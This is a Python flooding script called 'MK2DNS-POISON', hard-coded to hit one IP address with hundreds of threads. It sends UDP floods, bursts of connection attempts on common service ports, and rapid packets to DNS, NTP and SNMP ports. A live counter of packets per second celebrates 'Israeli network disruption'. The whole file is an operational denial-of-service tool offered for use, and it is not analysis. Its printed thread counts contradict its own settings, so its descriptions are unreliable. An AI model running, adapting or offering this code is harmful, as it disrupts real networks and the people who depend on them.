import socket
import threading
import time
import random
import struct

# TARGET
TARGET_IP = "62.109.121.42"

# EXTREME OPTIMIZATION CONSTANTS
UDP_THREADS = 400      # Increased from 200
SYN_THREADS = 250      # Increased from 100  
SOCKET_POOL_SIZE = 20  # More sockets per thread
BATCH_SIZE = 10        # Send multiple packets per loop

# Socket pools for MAXIMUM performance
udp_socket_pool = []
syn_socket_pool = []

for _ in range(100):  # Large socket pool
    try:
        udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udp_sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
        udp_socket_pool.append(udp_sock)
    except:
        pass

for _ in range(50):
    try:
        syn_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        syn_sock.settimeout(0.001)
        syn_socket_pool.append(syn_sock)
    except:
        pass

# Global counters with minimal locking
packets_sent = 0
last_reset = time.time()

# Pre-generated payloads to avoid overhead
PAYLOAD_CACHE = []
for _ in range(100):
    size = random.randint(64, 512)
    PAYLOAD_CACHE.append(random.randbytes(size))

# Critical Israeli ports (pre-defined)
CRITICAL_PORTS = [80, 443, 22, 21, 25, 53, 123, 161, 162, 389, 636, 3389, 5900, 8080, 8443]

# ==================== EXTREME UDP BOMBER ====================
def extreme_udp_bomber(worker_id):
    global packets_sent
    
    # Get socket from pool
    sock = udp_socket_pool[worker_id % len(udp_socket_pool)]
    
    while True:
        try:
            # BATCH SENDING - Send multiple packets per loop
            for _ in range(BATCH_SIZE):
                # Fast payload selection
                payload = PAYLOAD_CACHE[worker_id % len(PAYLOAD_CACHE)]
                
                # Fast port generation (1-65535)
                port = (worker_id * 997 + int(time.time() * 1000)) % 65535 + 1
                
                # ULTRA-FAST SEND
                sock.sendto(payload, (TARGET_IP, port))
                
                # Lock-free counter increment
                packets_sent += 1
                
        except:
            # Reuse same socket - don't recreate
            pass

# ==================== EXTREME SYN STORM ====================
def extreme_syn_storm(worker_id):
    global packets_sent
    
    # Multiple sockets for this thread
    socks = []
    for i in range(3):
        idx = (worker_id * 3 + i) % len(syn_socket_pool)
        socks.append(syn_socket_pool[idx])
    
    port_index = 0
    
    while True:
        try:
            # Round-robin through sockets
            sock = socks[port_index % len(socks)]
            
            # Fast port selection from critical list
            port = CRITICAL_PORTS[port_index % len(CRITICAL_PORTS)]
            
            # ULTRA-FAST SYN
            result = sock.connect_ex((TARGET_IP, port))
            
            # Counter increment
            packets_sent += 1
            
            # Rotate port
            port_index += 1
            
            # If connection succeeded, create new socket
            if result == 0:
                try:
                    new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    new_sock.settimeout(0.001)
                    socks[port_index % len(socks)] = new_sock
                except:
                    pass
                    
        except:
            # Replace broken socket
            try:
                new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                new_sock.settimeout(0.001)
                socks[port_index % len(socks)] = new_sock
            except:
                pass

# ==================== PORT RAPID FIRE ====================
def port_rapid_fire(worker_id):
    """Specialized high-PPS UDP to specific ports"""
    global packets_sent
    
    sock = udp_socket_pool[(worker_id + 50) % len(udp_socket_pool)]
    
    # Fast ports only
    fast_ports = [53, 123, 161, 1900, 5060]
    
    # Smallest payload for max PPS
    small_payload = b'\x00' * 64
    
    port_index = 0
    
    while True:
        try:
            # RAPID FIRE - No delays, no thinking
            port = fast_ports[port_index % len(fast_ports)]
            sock.sendto(small_payload, (TARGET_IP, port))
            packets_sent += 1
            
            # Next port
            port_index += 1
            
            # Sometimes send multiple to same port
            if random.random() < 0.3:
                sock.sendto(small_payload, (TARGET_IP, port))
                packets_sent += 1
                
        except:
            pass

# ==================== LAUNCH EXTREME ATTACK ====================
print("╔══════════════════════════════════════════════════════════╗")
print("║               MK2DNS-POISON v2.2 - EXTREME              ║")
print("║                 PPS MAXIMIZATION MODE                   ║")
print("╚══════════════════════════════════════════════════════════╝")
print()
print(f"[+] TARGET: {TARGET_IP}")
print(f"[+] UDP THREADS: {UDP_THREADS} (EXTREME)")
print(f"[+] SYN THREADS: {SYN_THREADS} (EXTREME)")
print(f"[+] PORT RAPID FIRE: 50 threads")
print(f"[+] TOTAL THREADS: {UDP_THREADS + SYN_THREADS + 50}")
print(f"[+] SOCKET POOL: {len(udp_socket_pool)} UDP + {len(syn_socket_pool)} SYN")
print(f"[+] BATCH SIZE: {BATCH_SIZE} packets/loop")
print()
print("="*60)

# Start threads
threads = []

# Extreme UDP Bombers
print("[+] DEPLOYING 300 EXTREME UDP BOMBERS...")
for i in range(UDP_THREADS):
    t = threading.Thread(target=extreme_udp_bomber, args=(i,))
    t.daemon = True
    t.start()
    threads.append(t)

# Extreme SYN Storm
print("[+] DEPLOYING 150 EXTREME SYN STORM...")
for i in range(SYN_THREADS):
    t = threading.Thread(target=extreme_syn_storm, args=(i,))
    t.daemon = True
    t.start()
    threads.append(t)

# Port Rapid Fire
print("[+] DEPLOYING 50 PORT RAPID FIRE...")
for i in range(50):
    t = threading.Thread(target=port_rapid_fire, args=(i,))
    t.daemon = True
    t.start()
    threads.append(t)

print("[✓] 500 EXTREME THREADS DEPLOYED")
print("="*60)

# ==================== MONITORING ====================
last_log = time.time()
peak_pps = 0
attack_start = time.time()

print("\n[🔥] EXTREME ATTACK ACTIVE - PPS MAXIMIZATION\n")

while True:
    time.sleep(1)  # Monitor every second
    current_time = time.time()
    elapsed = current_time - last_log
    last_log = current_time
    
    # Calculate PPS
    pps = int(packets_sent / elapsed) if elapsed > 0 else 0
    packets_sent = 0
    
    # Track peak
    if pps > peak_pps:
        peak_pps = pps
    
    # Attack duration
    duration = int(current_time - attack_start)
    
    # Display EXTREME stats
    print(f"[{duration:03d}s] PPS: {pps:,} | PEAK: {peak_pps:,} | THREADS: 500")
    
    # Performance tips based on current PPS
    if pps < 10000:
        print("   ⚡ TIP: Increase BATCH_SIZE or add more UDP threads")
    elif pps < 25000:
        print("   ⚡ TIP: Good, optimizing socket reuse...")
    elif pps < 50000:
        print("   ⚡ TIP: EXCELLENT - Reaching maximum device output")
    else:
        print("   ⚡ MAXIMUM OUTPUT ACHIEVED!")
    
    # Auto-optimization suggestion
    if duration % 10 == 0:  # Every 10 seconds
        if pps < 15000:
            print(f"\n[🛠️ ] OPTIMIZATION: Try reducing payload size to 64 bytes")
        elif pps < 30000:
            print(f"\n[🛠️ ] OPTIMIZATION: All threads active, maximum PPS")
    
    # Critical achievement
    if pps > 50000:
        print("\n[🎯] ACHIEVEMENT UNLOCKED: 50K+ PPS - EXTREME MODE")
        print("    Israeli network disruption: MAXIMUM")
    
    # Reset peak every 30 seconds
    if duration % 30 == 0:
        peak_pps = pps
